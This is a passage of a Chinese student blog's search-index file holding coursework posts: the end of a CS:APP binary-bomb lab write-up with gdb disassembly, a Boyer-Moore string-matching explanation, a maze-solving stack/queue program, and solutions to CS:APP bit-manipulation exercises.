class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *(0x603410)</span><br><span class="line"><span class="variable">$3</span> = 0x1cf</span><br><span class="line">(gdb) p/x *(0x603410 + 8)</span><br><span class="line"><span class="variable">$4</span> = 0x603420</span><br><span class="line">(gdb) p/x *(0x603420)</span><br><span class="line"><span class="variable">$5</span> = 0x188</span><br><span class="line">(gdb) p/x *(0x603420 + 8)</span><br><span class="line"><span class="variable">$6</span> = 0x603430</span><br><span class="line">(gdb) p/x *(0x603430)</span><br><span class="line"><span class="variable">$7</span> = 0x1d1</span><br><span class="line">(gdb) p/x *(0x603430 + 8)</span><br><span class="line"><span class="variable">$8</span> = 0x603440</span><br><span class="line">(gdb) p/x *(0x603440)</span><br><span class="line"><span class="variable">$9</span> = 0x174</span><br><span class="line">(gdb) p/x *(0x603440 + 8)</span><br><span class="line"><span class="variable">$10</span> = 0x603450</span><br><span class="line">(gdb) p/x *(0x603450)</span><br><span class="line"><span class="variable">$11</span> = 0x220</span><br><span class="line">(gdb) p/x *(0x603450 + 8)</span><br><span class="line"><span class="variable">$12</span> = 0x603460</span><br><span class="line">(gdb) p/x *(0x603460 + 8)</span><br><span class="line"><span class="variable">$13</span> = 0x0</span><br></pre></td></tr></tbody></table></figure><p>故答案应为6 5 3 1 2 4;  </p><h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>正常通过前6关是无法触发secret_phase的,查看汇编发现,在phase_4答案之后输入DrEvil即可进入secret_phase.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas secret_phase </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> secret_phase:</span><br><span class="line">   0x0000000000401191 &lt;+0&gt;:push   %rbx</span><br><span class="line">   0x0000000000401192 &lt;+1&gt;:callq  0x40155c &lt;read_line&gt;</span><br><span class="line">   0x0000000000401197 &lt;+6&gt;:mov    <span class="variable">$0xa</span>,%edx</span><br><span class="line">   0x000000000040119c &lt;+11&gt;:mov    <span class="variable">$0x0</span>,%esi</span><br><span class="line">   0x00000000004011a1 &lt;+16&gt;:mov    %rax,%rdi</span><br><span class="line">   0x00000000004011a4 &lt;+19&gt;:callq  0x400b80 &lt;strtol@plt&gt;</span><br><span class="line">   0x00000000004011a9 &lt;+24&gt;:mov    %rax,%rbx</span><br><span class="line">   0x00000000004011ac &lt;+27&gt;:lea    -0x1(%rax),%eax</span><br><span class="line">   0x00000000004011af &lt;+30&gt;:cmp    <span class="variable">$0x3e8</span>,%eax</span><br><span class="line">   0x00000000004011b4 &lt;+35&gt;:jbe    0x4011bb &lt;secret_phase+42&gt;</span><br><span class="line">   0x00000000004011b6 &lt;+37&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011bb &lt;+42&gt;:mov    %ebx,%esi</span><br><span class="line">   0x00000000004011bd &lt;+44&gt;:mov    <span class="variable">$0x603230</span>,%edi</span><br><span class="line">   0x00000000004011c2 &lt;+49&gt;:callq  0x401153 &lt;fun7&gt;</span><br><span class="line">   0x00000000004011c7 &lt;+54&gt;:cmp    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x00000000004011ca &lt;+57&gt;:je     0x4011d1 &lt;secret_phase+64&gt;</span><br><span class="line">   0x00000000004011cc &lt;+59&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011d1 &lt;+64&gt;:mov    <span class="variable">$0x4024d0</span>,%edi</span><br><span class="line">   0x00000000004011d6 &lt;+69&gt;:callq  0x400ac0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004011db &lt;+74&gt;:callq  0x401682 &lt;phase_defused&gt;</span><br><span class="line">   0x00000000004011e0 &lt;+79&gt;:pop    %rbx</span><br><span class="line">   0x00000000004011e1 &lt;+80&gt;:retq   </span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas fun7</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> fun7:</span><br><span class="line">   0x0000000000401153 &lt;+0&gt;:sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000401157 &lt;+4&gt;:<span class="built_in">test</span>   %rdi,%rdi</span><br><span class="line">   0x000000000040115a &lt;+7&gt;:je     0x401187 &lt;fun7+52&gt;</span><br><span class="line">   0x000000000040115c &lt;+9&gt;:mov    (%rdi),%edx</span><br><span class="line">   0x000000000040115e &lt;+11&gt;:cmp    %esi,%edx</span><br><span class="line">   0x0000000000401160 &lt;+13&gt;:jle    0x40116f &lt;fun7+28&gt;</span><br><span class="line">   0x0000000000401162 &lt;+15&gt;:mov    0x8(%rdi),%rdi</span><br><span class="line">   0x0000000000401166 &lt;+19&gt;:callq  0x401153 &lt;fun7&gt;</span><br><span class="line">   0x000000000040116b &lt;+24&gt;:add    %eax,%eax</span><br><span class="line">   0x000000000040116d &lt;+26&gt;:jmp    0x40118c &lt;fun7+57&gt;</span><br><span class="line">   0x000000000040116f &lt;+28&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000401174 &lt;+33&gt;:cmp    %esi,%edx</span><br><span class="line">   0x0000000000401176 &lt;+35&gt;:je     0x40118c &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401178 &lt;+37&gt;:mov    0x10(%rdi),%rdi</span><br><span class="line">   0x000000000040117c &lt;+41&gt;:callq  0x401153 &lt;fun7&gt;</span><br><span class="line">   0x0000000000401181 &lt;+46&gt;:lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401185 &lt;+50&gt;:jmp    0x40118c &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401187 &lt;+52&gt;:mov    <span class="variable">$0xffffffff</span>,%eax</span><br><span class="line">   0x000000000040118c &lt;+57&gt;:add    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000401190 &lt;+61&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>此题题意为在一个题目中构建好的平衡二叉树中从根节点开始查找一个输入的数.<br>由节点向左为0,由节点向右为1,查找路径序的0-1列从右向左构成一个二进制数,该<br>二进制数的十进制值必须等于题目中提供的数,其为4,那么所需查找路径序列为100,<br>根据二叉树结构,应该查找7,故答案为7.</p><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p><img src="ret1.png" alt="结果"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 二进制炸弹 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构:BM算法</title>
      <link href="2018/12/01/shu-ju-jie-gou-bm-suan-fa/"/>
      <url>2018/12/01/shu-ju-jie-gou-bm-suan-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>BM算法是一种后缀匹配算法,其具有比KMP算法更优秀的性能表现.其核心思想有二<br>,第一是坏字符,坏字符就是pattern与text从右往左第一失配的在text中的字符,<br>二是好后缀,好后缀就是pattern与text从右往左连续匹配成功的子串.对于坏字符<br>和好后缀,有各自的模式串移动规则,可以确定各自失配时需要移动的位数,最终选<br>择二者中移动位数较大者移动.在主函数中,让用户输入文档名与需要查找的单词.<br>每次从文档中读取一行进行匹配搜索,每次使用BM算法搜索完成后,若搜索到单词,<br>则将主串中开始匹配的位置定为查找到单词的下一行,使用BM算法进行下一个匹配<br>搜索,直至搜索完当前行.而后循环直至匹配完整个文档.</p><a id="more"></a><h1 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h1><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">CreateBC</span><span class="params">(<span class="keyword">char</span>* pattern, <span class="keyword">int</span> len)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>传入模式串及其长度,返回根据坏字符的跳转数组.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">CreateSuffix</span><span class="params">(<span class="keyword">char</span>* pattern, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">CreateGS</span><span class="params">(<span class="keyword">char</span>* pattern, <span class="keyword">int</span> len)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>两个函数都需要传入模式串及其长度,第一个函数返回其后缀数组,第二个函数调<br>用第一个函数返回根据好后缀的跳转数组.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bm_search</span><span class="params">(<span class="keyword">char</span>* text, <span class="keyword">int</span> text_len, <span class="keyword">char</span>* pattern, <span class="keyword">int</span> pattern_len, <span class="keyword">int</span> *bc, <span class="keyword">int</span> *gs)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>传入主串及其长度,模式串及其长度,坏字符跳转数组,好后缀跳转数组.返回在主串<br>中查找到模式串的第一个位置,未查找到,则返回-1.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">get_line</span><span class="params">(FILE *article, <span class="keyword">char</span> (&amp;text)[<span class="number">1000</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>从给定的article文件中读取最大1000字符的一行,存在text位置,读取到文件末尾<br>则返回NULL.</p><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p><img src="ret.png" alt="运行结果"></p><p>此为从马丁路德金的I hava a dream演讲稿中查找dream得出的结果.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 串匹配 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构:迷宫问题</title>
      <link href="2018/11/10/shu-ju-jie-gou-mi-gong-wen-ti/"/>
      <url>2018/11/10/shu-ju-jie-gou-mi-gong-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><h2 id="图编号"><a href="#图编号" class="headerlink" title="图编号"></a>图编号</h2><p><img src="graph.png" alt="图编号"><br>如图所示，从上到下，从左到右，给17个顶点进行编号，以两个顶点代表一条边，例入2-3代表可以从顶点2走到顶点3。问题即为求解从2 -&gt; 17的通路。</p><h2 id="求解思想"><a href="#求解思想" class="headerlink" title="求解思想"></a>求解思想</h2><p>求解一条通路，应当从起点出发，不断前进到后续可行顶点，当在一个顶点无法继续前进时，则回退到上一个顶点，寻找其他可行顶点，直到到达终点。此思想符合数据结构栈的特点。首先将起点压栈，然后将从当前顶点可到达的一个顶点压栈，然后将该顶点标记为已访问，随后到达下一个顶点，在某个顶点无法继续走通时，将当前顶点出栈，回退到上一个顶点重新选择可以到达的且未访问的顶点。如此循环，直到终点被压入栈中，此时栈中所有顶点即为一条通路。</p><p>求解一条最短路径，应当从起点出发，访问所有可以到达的下一级顶点。再从所有下一级顶点出发，访问所有可访问的再下一级顶点，如此循环，每一级顶点距起点距离相同。过程中记录路线。此想法符合数据结构中队列的特点。首先，将起点入队。然后将队头元素出队，将该元素可访问到的且未被访问的顶点置为已访问，然后入队，注意记录被入队节点的前一个节点。直到队列为空。最后顺着终点的前驱顶点输出即可得到路线。若有多个终点，要寻找到最近的终点出去，则将结束循环条件改为有终点入队即可。</p><a id="more"></a><h1 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h1><h2 id="结构体及全局变量定义"><a href="#结构体及全局变量定义" class="headerlink" title="结构体及全局变量定义"></a>结构体及全局变量定义</h2><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">p</span>    //表示顶点,用于寻找最短路径时记录路径</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> code;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">p</span>* <span class="title">pre</span>;</span>  <span class="comment">//前一个顶点</span></span><br><span class="line">} Ver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> edge_cnt = <span class="number">29</span>;    <span class="comment">//边的数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> ver_cnt = <span class="number">17</span>;     <span class="comment">//顶点数量</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[edge_cnt][<span class="number">2</span>];       <span class="comment">//记录边</span></span><br><span class="line"><span class="keyword">int</span> my_stack[MAX] = {<span class="number">0</span>};    <span class="comment">//数组模拟栈</span></span><br><span class="line"><span class="keyword">int</span> my_quque[MAX] = {<span class="number">0</span>};    <span class="comment">//数组模拟队列</span></span><br><span class="line"><span class="keyword">int</span> top = <span class="number">0</span>;                <span class="comment">//栈顶指示</span></span><br><span class="line"><span class="keyword">int</span> front = <span class="number">0</span>, rear = <span class="number">0</span>;    <span class="comment">//队列首位指示</span></span><br><span class="line"><span class="keyword">bool</span> visit[ver_cnt + <span class="number">1</span>] = {<span class="literal">false</span>};  <span class="comment">//记录点是否访问过</span></span><br><span class="line">Ver vers[ver_cnt + <span class="number">1</span>];              <span class="comment">//每个点路径链表头结点</span></span><br></pre></td></tr></tbody></table></figure><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadmaze</span><span class="params">()</span></span>;            <span class="comment">//读入迷宫地图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visited</span><span class="params">(<span class="keyword">int</span> i)</span></span>;        <span class="comment">//将点i状态置为访问过</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isvisited</span><span class="params">(<span class="keyword">int</span> i)</span></span>;      <span class="comment">//判断点i是否访问过</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">hasway</span><span class="params">(<span class="keyword">int</span> s)</span></span>;         <span class="comment">//从点s出发是否有没去过的可行路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_way</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>;      <span class="comment">//找到一条通路</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_least</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>;    <span class="comment">//找到一条最短路径</span></span><br></pre></td></tr></tbody></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p><img src="ret.png" alt="运行结果"></p><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>本次实验，求解迷宫通路和最短通路，在不利用递归的情况下，使用模拟的栈和队列，实现了深度优先搜索和广度优先搜索。加强了对于栈和队列的理解以及使用熟练度。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
            <tag> 迷宫问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS:APP解题记录</title>
      <link href="2018/11/08/cs-app-jie-ti-ji-lu/"/>
      <url>2018/11/08/cs-app-jie-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="CS-APP-2-60"><a href="#CS-APP-2-60" class="headerlink" title="CS:APP 2.60"></a>CS:APP 2.60</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">replace_byte</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> i, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    x = x &amp; (~(<span class="number">0XFF</span> &lt;&lt; (i &lt;&lt; <span class="number">3</span>)));<span class="comment">//相应字节置零</span></span><br><span class="line">    x = x | (b &lt;&lt; (i &lt;&lt; <span class="number">3</span>));      <span class="comment">//相应字节改为char b</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> ret = replace_byte(<span class="number">0X12345678</span>, <span class="number">1</span>, <span class="number">0XAB</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0X%X\n"</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>0X1234AB78</p></blockquote><p>利用按位运算$x \&amp; 1 = x , b | 0 = b$。</p><a id="more"></a><h1 id="Csapp-2-65"><a href="#Csapp-2-65" class="headerlink" title="Csapp 2.65"></a>Csapp 2.65</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">odd_ones</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> x = odd_ones(<span class="number">0XB</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><pre><code>1</code></pre><p>对32位编码，1亦或所有0仍为1，偶数个1连续亦或结果为0，奇数个1连续亦或结果为1。对32位数，按照右移16，8，4，2，1依次右移使得前后各二分之一编码对齐，亦或结果存在后二分之一编码中，直至亦或总结过存于最低位中，结束，取最低位返回。</p><h1 id="Csapp-2-67"><a href="#Csapp-2-67" class="headerlink" title="Csapp 2.67"></a>Csapp 2.67</h1><h2 id="A"><a href="#A" class="headerlink" title="A"></a>A</h2><p>在int为w位的机器中，移位长度不应该超过$w - 1$。</p><h2 id="B"><a href="#B" class="headerlink" title="B"></a>B</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">int_size_is_32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span> == INT_MIN;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, int_size_is_32());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><pre><code>1</code></pre><p>若int为32位,则$1 &lt;&lt; 31 ==$ INT_MIN.</p><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">int_size_is_32_for_16</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">15</span> != INT_MIN) &amp;&amp; ((<span class="number">1</span> &lt;&lt; <span class="number">31</span>) == INT_MIN);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, int_size_is_32_for_16());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><pre><code>1</code></pre><p>当$1 &lt;&lt; 15 !=$ INT_MIN，证明int非16位后，后面即可判断int是否为32位.</p><h1 id="Csapp-2-68"><a href="#Csapp-2-68" class="headerlink" title="Csapp 2.68"></a>Csapp 2.68</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_one_mask</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(<span class="number">0XFFFFFFFF</span>u &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0X%X\n"</span>, lower_one_mask(<span class="number">6</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><pre><code>0X3F</code></pre><p>将无符号int最大值右移$(32 - n)$位，进行了逻辑右移，再强制转换为有符号int。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
